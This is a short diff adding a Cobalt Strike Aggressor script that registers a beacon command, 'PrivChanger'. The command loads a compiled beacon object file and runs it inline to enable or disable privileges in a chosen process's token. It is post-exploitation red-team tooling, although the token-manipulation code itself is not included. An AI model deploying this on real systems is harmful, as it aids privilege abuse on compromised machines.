@@ -1,0 +1,23 @@
+alias PrivChanger {
+	local('$handle $data $args $2,$3,$4');
+
+    if(size(@_) != 4){
+        berror($1, "PrivChanger: not enough arguments,Usage: PrivChanger [enable/disable] [exe to run] [pid] ");
+        return;
+    }
+
+    $handle = openf(script_resource("PrivChanger.o"));
+    $data   = readb($handle, -1);
+    closef($handle)
+
+    $args = bof_pack($1,"zzi",$2,$3,$4);
+
+    btask($1, "Running PrivChanger");
+
+
+    beacon_inline_execute($1,$data,"go",$args);
+}
+
+beacon_command_register(
+"PrivChanger",
+"Change privileges in a desired process's token");
